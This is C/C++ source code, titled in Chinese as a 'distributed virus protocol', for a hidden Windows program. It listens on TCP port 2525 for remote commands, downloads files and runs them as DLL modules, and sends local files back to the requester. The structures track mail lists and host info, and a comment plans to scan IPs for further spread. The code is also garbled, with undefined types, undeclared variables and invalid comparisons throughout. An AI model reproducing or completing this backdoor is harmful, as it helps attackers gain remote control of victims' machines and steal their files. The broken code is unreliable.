/*
分布式病毒协议的C/C++描述代码
Coded by HuangSiJieTechnology 
*/
#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
typedef struct CONNINST
{
SOCKET socket; /* 本地Socket号 */
unsigned short clientPort; /* 客户端端口 */
struct in_addr clientIP; /* 客户端IP地址 */
time_t beginTime; /* 连接建立时间 - 预留 */
time_t updateTime; /* 最后更新时间 - 预留 */
WORD lastestSequenceNumber; /* 最新包序号 */
unsigned short key; /* 密钥 - 预留*/
unsigned short cmdLen; /* 结果堆长度 */
char *pCmd; /* 命令堆 */
unsigned short resultLen; /* 结果堆长度 */
char *pResult; /* 结果堆 */
struct CONNINST* next; /* 下一个请求实例的地址 */
}CONNINST, *pCONNINST;
typedef struct Maillist
{
String Address;
String Name;
Struct Maillist *pNext;
}Maillist,*pMaillist;
typedef struct Moudlelist
{
String MoudleName;
String MoudleFileName;
String MoudleGuid;
String UseFor;
String MoudleAuther;
Struct Moudlelist *pNext;
}Moudlelist,*pMoudlelist;
typedef struct FileUpData
{
struct in_addr clientIP;
DWORD port;
DWORD SAMGuid;
String FileName;
lvoid cmd;
}FileUpData,*pFileUpData;

typedef struct DVPPak
{
String SAMCommand;
String Guid;
String Auther;
lvoid Cmd;
pMaillist *pMail;
pMoudlelist *pMoudle;
String Versionofme;
pmyPCinfo *pcinfo;
}DVPPak, *pDVPPak;

HINSTANCE hInst; /* 当前实例句柄 */
HWND hWndMain; /* 主窗口句柄 */
SOCKET listenSocket; /* 监听套接口 */
pCONNINST pConnInstHead;
pCONNINST addConnInst(SOCKET, unsigned short, struct in_addr);
pCONNINST getConnInst(SOCKET);
void OnWrite(SOCKET socket);
int netHalt(void);
void delConnInst(pCONNINST);
Void DvpExpCmd(Socket s);
void delAllConnInst(void);
void RecvFileThreadProc(pFileUpData *plm);
void SendFileThreadProc(pFileUpData *plm);
int uiStartup(HINSTANCE hInstance, int nCmdShow);
LRESULT CALLBACK MainWndProc(HWND,UINT,WPARAM,LPARAM);
int netStartup(void);
void OnAccept(SOCKET socket);
void OnClose(SOCKET socket);
void OnRead(SOCKET socket);
void sendResult(SOCKET socket);
int netStartup(void)
{
unsigned short wVersionRequested=MAKEWORD(1,1);
WSADATA wsaData;
SOCKADDR_IN saServer; 
DWORD dwAddrStrLen;
char szAddress[128];
int nRet;

/* 初始化WinSock */
if(WSAStartup(wVersionRequested, &wsaData)!=0)
{
//("Dvp 错误 :: 网络协议启动失败,请重新启动计算机.");
}
/* 检查Winsock版本 */
if(wsaData.wVersion != wVersionRequested)
{
//("Dvp 错误 :: 网络协议版本错误,请升级Winsock.");
}

/* 创建流式套接口 */
listenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if(listenSocket==INVALID_SOCKET)
{
//("ERROR :: Can not create steam socket.");
return 0;
}

/* 通知套接口有请求事件发生 */
nRet=WSAAsyncSelect(listenSocket, 
hWndMain, //在网络事件发生时需要接收消息的窗口句柄
UM_ASYNC, //在网络事件发生时要接收的消息
FD_ACCEPT | FD_READ | FD_WRITE | FD_CLOSE);
//只在程式开始执行一次，以后只要有套接口请求就发送消息
if (nRet==SOCKET_ERROR)
{
//("ERROR :: Can not initialize steam socket.");
closesocket(listenSocket);
return 0;
}

/* 地址结构设定 */
saServer.sin_port=htons(2525); //端口在这里哦
saServer.sin_family=AF_INET;
saServer.sin_addr.s_addr=INADDR_ANY;

/* 将一本地地址3872与套接口listenSocket捆绑 */
nRet=bind(listenSocket, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));
if (nRet==SOCKET_ERROR)
{
//("ERROR :: Can not bind socket to local port 1936.");
//("HINT :: Dvp Kernel Server can only run in one thread.");
closesocket(listenSocket);
return 0;
}

/* 让套接口开始监听 */
nRet = listen(listenSocket, SOMAXCONN);
if (nRet == SOCKET_ERROR)
{
//("ERROR :: Can not listen.");
closesocket(listenSocket);
return 0;
}

dwAddrStrLen = sizeof(szAddress);
GetLocalAddress(szAddress, &dwAddrStrLen);
return 1;
}

/* Unknown how */
int GetLocalAddress(LPSTR lpStr, LPDWORD lpdwStrLen)
{
struct in_addr *pinAddr;
LPHOSTENT lpHostEnt;
int nRet;
int nLen;

// Get our local name
nRet = gethostname(lpStr, *lpdwStrLen);
if(nRet==SOCKET_ERROR)
{
lpStr[0]='\0';
return SOCKET_ERROR;
}

// "Lookup" the local name
lpHostEnt=gethostbyname(lpStr);
if(lpHostEnt==NULL)
{
lpStr[0] = '\0';
return SOCKET_ERROR;
}

// format first address in the list
pinAddr=((LPIN_ADDR)lpHostEnt->h_addr);
nLen=strlen(inet_ntoa(*pinAddr));
if((DWORD)nLen>*lpdwStrLen)
{
*lpdwStrLen=nLen;
WSASetLastError(WSAEINVAL);
return SOCKET_ERROR;
}

*lpdwStrLen = nLen;
strcpy(lpStr, inet_ntoa(*pinAddr));
return 0;
}

int uiStartup(HINSTANCE hInstance, int nCmdShow)
{
WNDCLASS DvpWindow;

HANDLE hObject;

/* 创建实例 */
hInst=hInstance;

/* 判断是否已经运行 */
hObject=CreateMutex(NULL,FALSE,"DvpC");
if(GetLastError() == ERROR_ALREADY_EXISTS)
{
CloseHandle(hObject);
PostQuitMessage(0);
return 0;
}

/* 创建窗口 */
DvpWindow.style=0;//指定类的风格
DvpWindow.lpfnWndProc=(WNDPROC)MainWndProc;//窗口过程的远指针
DvpWindow.cbClsExtra=0;//窗口结构额外字节数
DvpWindow.cbWndExtra=0;//窗口实例额外字节数
DvpWindow.hInstance=hInstance;//窗口过程所在的实例
DvpWindow.hIcon=LoadIcon(hInstance,MAKEINTRESOURCE(MAIN));//调用标识类的图标
DvpWindow.hCursor=LoadCursor(NULL,IDC_ARROW);//调用标识类的光标
DvpWindow.hbrBackground=(HBRUSH)GetStockObject(WHITE_BRUSH);//标识背景类的画刷
DvpWindow.lpszMenuName=NULL;//指向标识类菜单资源的字符串，以空字符结束
DvpWindow.lpszClassName="DVPSample";//标识本类的名称
RegisterClass(&DvpWindow);//注册窗口

hWndMain=CreateWindow("DVPSample",
"DVPSample",
WS_OVERLAPPEDWINDOW,
CW_USEDEFAULT,CW_USEDEFAULT,
CW_USEDEFAULT,CW_USEDEFAULT,
NULL,NULL,hInstance,NULL);
if(!hWndMain) return 0;
ShowWindow(hWndMain,SW_HIDE);//显示窗口
UpdateWindow(hWndMain);//更新窗口
return 1;
}
//处理窗口消息
LRESULT CALLBACK MainWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
switch(message)//开始处理消息
{

/* User Interface Message */
case WM_CLOSE:
return(DefWindowProc(hWnd,message,wParam,lParam));
break;

case WM_DESTROY:
deleteSystrayIcon();
PostQuitMessage(0);
break;

case WM_SIZE:
delAllConnInst();
break;

/* Network Message */
case UM_ASYNC:
switch(WSAGETSELECTEVENT(lParam))
{
case FD_ACCEPT:
OnAccept((SOCKET)wParam);
break;
case FD_READ:
OnRead((SOCKET)wParam);
break;

case FD_WRITE:
OnWrite((SOCKET)wParam);
break;

case FD_CLOSE:
OnClose((SOCKET)wParam);
break;
}
break;

default:
return(DefWindowProc(hWnd,message,wParam,lParam));//默认窗口过程的消息处理
}
return(0);
}

pCONNINST addConnInst(SOCKET socket, unsigned short port, struct in_addr ip)
{
/* 分配一块新的连接实例 */
pCONNINST newConnInst=(pCONNINST)malloc(sizeof(CONNINST));
/* 没有内存了 */
if(newConnInst==NULL) return NULL;

/* 分配一块新的SOCKADDR实例 */
// newConnInst->sockAddr=(LPSOCKADDR)malloc(nAddrLen);
// newConnInst->sockAddr=malloc(nAddrLen);
/* 没有内存了 */
// if(newConnInst->lpSockAddr==NULL)
// {
// free(newConnInst);
// return NULL;
// }

//装填新的请求包
newConnInst->socket=socket;
newConnInst->clientPort=port;
newConnInst->clientIP=ip;

newConnInst->pCmd=NULL;
newConnInst->pResult=NULL;
newConnInst->cmdLen=0;
newConnInst->resultLen=0;

newConnInst->beginTime=time(NULL);
newConnInst->updateTime=newConnInst->beginTime;
newConnInst->lastestSequenceNumber=0;
newConnInst->next=NULL;

//如果请求链表是空的
if(pConnInstHead==NULL)
{
//将这个请求作为链表头，放到pConnInstHead
pConnInstHead=newConnInst;
}
else
{
pCONNINST tempConn=pConnInstHead;
//走到链表尾
while(tempConn->next) tempConn=tempConn->next;

//追加新包到链表尾
tempConn->next=newConnInst;
}

//返回装填好的包的指针
return newConnInst;
}

pCONNINST getConnInst(SOCKET socket)
{
/* 遍历链表，寻找套接口 */
pCONNINST tempConn=pConnInstHead;
while(tempConn!=NULL)
{
if(tempConn->socket==socket) break;
tempConn=tempConn->next;
}
/*若没有，返回NULL */
return(tempConn);
}

void delConnInst(pCONNINST pConnInstToDel)
{
/* 如果要删除的是链表头 */
if(pConnInstToDel==pConnInstHead)
{
/* pConnInstHead->next 成为头 */
pConnInstHead=pConnInstHead->next;
/* 对链表头的free()在最后进行 */
}
else 
{ 
pCONNINST tempConn=pConnInstHead;
/* 从链表头开始 到NULL为止 每次指向下一个*/
while(tempConn!=NULL)
{
/* 若当前的下一个是要被删除的 */
if (tempConn->next==pConnInstToDel)
{
/* 当前的下一个变成下一个的(要被删除的)下一个 */
tempConn->next=pConnInstToDel->next;
break;
}
}
}

/* 释放pConnInstToDel占用的内存 */
free(pConnInstToDel->pCmd);
free(pConnInstToDel->pResult);
free(pConnInstToDel);
return;
}

void delAllConnInst(void)
{
pCONNINST tempConn=pConnInstHead;
pCONNINST tempConn2;

/* 遍历链表，依次释放内存 */
/* 若存在tempConn则继续for */
while(tempConn!=NULL)
{
tempConn2=tempConn->next;
// free(tempConn->lpSockAddr);
// free(tempConn->pResultBuf);
free(tempConn->pCmd);
free(tempConn->pResult);
free(tempConn);
tempConn=tempConn2;
}
pConnInstHead=NULL;
return;
}
void OnAccept(SOCKET socket)
{
SOCKADDR_IN sockAddrIn;
pCONNINST connInst=NULL;
SOCKET peerSocket;
int tempLength;

// accept the new socket descriptor
tempLength=sizeof(SOCKADDR_IN);
peerSocket=accept(listenSocket, (struct sockaddr FAR *)&sockAddrIn, (int FAR*)&tempLength);
if(peerSocket==SOCKET_ERROR)
{
if(WSAGetLastError()!=WSAEWOULDBLOCK)
{
//("Error! Accept error. The request form %s can't be accepted.",inet_ntoa(sockAddrIn.sin_addr));
return;
}
}

//让它也可以在读写或关闭的时候向窗口发送消息
WSAAsyncSelect(peerSocket, hWndMain, UM_ASYNC, FD_READ | FD_WRITE | FD_CLOSE);
if(peerSocket==SOCKET_ERROR)
{
//("Error! WSAAsyncSelect error. The request form %s can't be accepted.",inet_ntoa(sockAddrIn.sin_addr));
return;
}

//将这已连接的套接口放到链表里
connInst=addConnInst(peerSocket, sockAddrIn.sin_port, sockAddrIn.sin_addr);
if (connInst==NULL)
{
//内存满了
//("Error! Memory is full! The request form %s can not be accepted",inet_ntoa(sockAddrIn.sin_addr));
closesocket(peerSocket);
return;
}
//("A new request from: %s is accepted on socket %d.",
inet_ntoa(sockAddrIn.sin_addr), peerSocket);
return;
}
void OnClose(SOCKET socket)
{
pCONNINST connInst;

// 检查是否已经删除了这个套接口
connInst=getConnInst(socket);
if (connInst==NULL) return; 

// It is still in stock list
// The client must have to reset the connection.
// Clean up.
//("The request from %s has been closed. Local socket: %d is free now.", inet_ntoa(connInst->clientIP), connInst->socket);
closesocket(connInst->socket);
delConnInst(connInst);
}
/* 可以读取数据了 */
void OnRead(SOCKET socket)
{
pCONNINST connInst;
int bytesReceive;
char* pNewCmd=NULL;

/* 查找对应的连接实例 */
connInst=getConnInst(socket);

/* 如果找不到连接实例, 读光缓冲区, 然后ByeBye */
if(connInst==NULL)
{
char buf[1024];
while(recv(socket, buf, sizeof(buf)-1, 0)!=SOCKET_ERROR);
closesocket(socket);
//("When ready to receive (OnREAD), get some noise - DEBUG");
//("it is %c%c%c",buf[0],buf[1],buf[2]);
return;
}

/* 否则将所有数据读入命令堆 */
if(connInst->pCmd==NULL)
{
connInst->pCmd=(char*)malloc(64);
connInst->cmdLen=0;
if(connInst->pCmd==NULL)
{
//("Before receiving data from %s, local memory overflowed.", inet_ntoa(connInst->clientIP));
closesocket(connInst->socket);
delConnInst(connInst);
return;
}
}

pNewCmd=(char*)malloc(64);
if(pNewCmd==NULL)
{
//("Before receiving data from %s, local memory overflowed.", inet_ntoa(connInst->clientIP));
closesocket(connInst->socket);
delConnInst(connInst);
return;
}
memset(pNewCmd, 0, 64);

bytesReceive=recv(socket, pNewCmd, 64, 0);
//("收到:%d字节",bytesReceive);

if(bytesReceive==SOCKET_ERROR)
{
//操作此时由于Windows Sockets实现的资源或其它限制的制约而无法调度
if(WSAGetLastError()==WSAEWOULDBLOCK) return;
//("recv() Error");
//("Closing socket: %d", connInst->socket);
closesocket(connInst->socket);
delConnInst(connInst);
return;
}

/* 有的时候, OnRead消息是假的, 收到的字节数是-1, 要忽略这种情况*/
if(bytesReceive>0)
{
connInst->pCmd=(char*)realloc(connInst->pCmd, connInst->cmdLen+bytesReceive);
memcpy(&connInst->pCmd[connInst->cmdLen], pNewCmd, bytesReceive);
connInst->cmdLen+=bytesReceive;

free(pNewCmd);
DvpExpCmd(socket);
}
else
{
free(pNewCmd);
}

return;
}

Void DvpExpCmd(Socket s)
{
pCONNINST connInst=getConnInst(s);
char *pThisCmd=NULL; /* 从命令堆里面读取第一个命令包, 这个用来保存命令包的地址 */
char *pSwap=NULL; /* 清除命令堆旧命令交换用的指针 */
if(pThisCmd==NULL)
{
//("DEBUG - 无法定义命令包起点, 函数返回, 等待命令.");
return;
}

if(pThisCmd > connInst->pCmd)
{
/*
如果前面有残余数据, 那么就立刻清除残余数据
这种情况遇到的不会多
*/
//("处理残余数据");
pSwap=connInst->pCmd;
connInst->pCmd=strdup(pThisCmd);
connInst->cmdLen-=(pThisCmd-connInst->pCmd);
free(pSwap);
/* 继续 */
}
LVoid pak;
while (*pThisCmd!=Null)
{
pak+=*pThisCmd;
pThisCmd+=sizeof(char);
}
pDVPPak *myDvp=*(DVPPak*)pak;
if(myDvp->SAMCommand=='UPData')
{/*对方传文件给我们！！*/
pFileUpData *Up=*(FileUpData*)myDvp->cmd;
DWORD dwThread;
if(*up!=Null){up->clientIP=pThisCmd->clientIP;
if(CreateThread(NULL,0,RecvFileThreadProc, *up, 0, &dwThread)==NULL)//文件接受线程
{//something wrong with Recv... }else
{ if(CheckSam(myDvp->Guid,myDvp->Auther)!='No')//处理权限,自己发挥吧。。。
{ int (__stdcall*) MoudleStart=(void*)GetProcAddress(LoadLibrary(UP->FileName),"MoudleStartMe" );
MoudleStart(Up->Cmd);//开始执行！
}}
}
free(up);
}
if(myDvp->SAMCommand=='GetData')
{/*2002.10.19*/
/*对方要我们的文件*/
pFileUpData *Up=*(FileUpData*)myDvp->cmd;
if(up!=Null){up->clientIP=pThisCmd->clientIP;
DWORD dwThread;
if(CreateThread(NULL,0,SendFileThreadProc, *up, 0, &dwThread)==NULL)//文件传送线程
{//something wrong with Recv... }
else{/*传输SamCmmand='UpData',cmd=(lvoid*)up给对方*/}}
free(up);
}
if(myDvp->SAMCommand==Null)
{
/*处理对方发来信息中有用的信息*/
/*对于我们来讲，这个问题是应该由个人处理的*/
/*对于这里我们还要给对方返回一包即我们的信息*/ 
/*此处需要发送消息到对方，来获得如文件之类的东西*/

}
free(pThisCmd);
free(myDvp);
return -1;
}

void OnWrite(SOCKET socket)
{
pCONNINST connInst;

connInst=getConnInst(socket);
/* 如果找不到连接实例, 读光缓冲区, 然后ByeBye */
if(connInst==NULL)
{
char buf[1024];
while(recv(socket, buf, sizeof(buf)-1, 0)!=SOCKET_ERROR);
closesocket(socket);
//("When ready to send, get some noise");
//("it is %c%c%c",buf[0],buf[1],buf[2]);
return;
}

/* 如果连接实例有需要发送的数据 */
if(connInst->pResult!=NULL)
{
sendResult(socket);
}
return;
}
void sendResult(SOCKET socket)
{
pCONNINST connInst=getConnInst(socket);
int bytesSent;

bytesSent=send(connInst->socket, connInst->pResult, connInst->resultLen, 0);
if(bytesSent==SOCKET_ERROR)
{
if (WSAGetLastError()!=WSAEWOULDBLOCK)
{
//("send() Error");
//("Closing socket: %d", connInst->socket);
closesocket(connInst->socket);
delConnInst(connInst);
return;
}
}
if((unsigned int)bytesSent<connInst->resultLen)//如果发送的字节少于结果字节
{
char* temp;
connInst->resultLen=connInst->resultLen-bytesSent;
temp=(char*)malloc(connInst->resultLen);
memcpy(temp,connInst->pResult+bytesSent,connInst->resultLen);
free(connInst->pResult);
connInst->pResult=temp;
}
else //如果全部发送完毕
{
free(connInst->pResult);
connInst->resultLen=0;
connInst->pResult=NULL;
}
}

int netHalt(void)
{
pCONNINST connTemp;

/* 关闭监听套接口 */
closesocket(listenSocket);

/* 关闭所有正在连接的套接口 */
connTemp=pConnInstHead;
while(connTemp)
{
closesocket(connTemp->socket);
connTemp=connTemp->next;
}

/* 清除请求包链表 */
delAllConnInst();
Beep(200,50);
WSACleanup();
return 1;
}
int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
MSG msg;

/* User Interface Startup */
uiStartup(hInstance, nCmdShow);

/* Network Startup */
netStartup();
/*我们在下面应该做些什么？搜索ip连接。。。。。*/

/* 进入消息循环 */
while(GetMessage(&msg,NULL,0,0))
{
TranslateMessage(&msg);
DispatchMessage(&msg);
}

/* Network Halt*/
netHalt();

return 0;
}

void RecvFileThreadProc(pFileUpData *plm)
{

// Open target file
// Get remote address
int i,nPort;
char svAddress[256];
lstrcpyn(svAddress,plm->clientIP->sin_addr->s_addr,256);
for(i=0;i<256;i++) {
if(svAddress==':') {
svAddress='\0';
nPort=atoi(&svAddress[i+1]);
break;
}
}

// Put into SOCKADDR_IN structure
SOCKADDR_IN saddr;
struct hostent *he;
DWORD dwIPAddr;

dwIPAddr=inet_addr(svAddress);
if(dwIPAddr==INADDR_NONE) {
he=gethostbyname(svAddress);
if(gethostbyname==NULL) {
free(plm);
return 1;
}
dwIPAddr=*(DWORD *)he->h_addr_list[0];
}

memset(&saddr,0,sizeof(SOCKADDR_IN));
saddr.sin_family=AF_INET;
saddr.sin_port=htons(plm->port);
saddr.sin_addr.s_addr=dwIPAddr;

// Create socket

SOCKET sv;
sv=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if(s==INVALID_SOCKET) {
free(plm);
return 1;
}

// Connect to remote port

if(connect(sv,(SOCKADDR *)&saddr,sizeof(SOCKADDR_IN))==SOCKET_ERROR) {
closesocket(sv);
free(plm);
return 1;
}

// Nonblocking mode
DWORD dwBlock=1;
ioctlsocket(sv, FIONBIO, &dwBlock);
HANDLE hFile;
hFile=CreateFile(plm->FileName,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
if(hFile!=NULL) {
int nBytes;
DWORD dwCount;
char svBuffer[1024];

do {
// Give up time
Sleep(20);

nBytes=recv(sv,svBuffer,1024,0);
if(nBytes>0) {
WriteFile(hFile,svBuffer,nBytes,&dwCount,NULL);
}
} while(nBytes>0);

CloseHandle(hFile);
}

closesocket(sv);
return 0;
}
void SendFileThreadProc(pFileUpData *plm)
{
SOCKET sv;
sv=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if(sv==INVALID_SOCKET) {
free(plm);
return -2;
}

// Bind to desired port
SOCKADDR_IN saddr;
memset(&saddr,0,sizeof(SOCKADDR_IN));
saddr.sin_family=AF_INET;
saddr.sin_port=htons(plm->port);
saddr.sin_addr.s_addr=0;

if(bind(sv,(SOCKADDR *)&saddr,sizeof(SOCKADDR_IN))==SOCKET_ERROR) {
closesocket(s);
free(pptp);
free(ppi);
return -1;
}

listen(sv,MAX_CONNECTIONS);

// Nonblocking mode
DWORD argp=TRUE;
ioctlsocket(sv,FIONBIO,&argp);
sleep(1000);
SOCKET psv;
int tempLength;

// accept the new socket descriptor
tempLength=sizeof(SOCKADDR_IN);
psv=accept(sv, (struct sockaddr FAR *)&sockAddrIn, (int FAR*)&tempLength);
if(peerSocket==SOCKET_ERROR)
{
if(WSAGetLastError()!=WSAEWOULDBLOCK)
{
//("Error! Accept error. The request form %s can't be accepted.",inet_ntoa(sockAddrIn.sin_addr));
return;
}
}
HANDLE hInFile;
hInFile=CreateFile(plm->FileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
if(hInFile==INVALID_HANDLE_value) {
//Couldn't open local file.
return -1;
}
char svBuffer[1024];
DWORD dwBytes;
do {
ReadFile(hInFile,svBuffer,1024,&dwBytes,NULL);
if(send(psv,svBuffer,dwBytes,0)<=0) break;
} while(dwBytes==1024);
closesocket(psv);
closesocket(sv);
CloseHandle(hInFile);
Return -1;
}
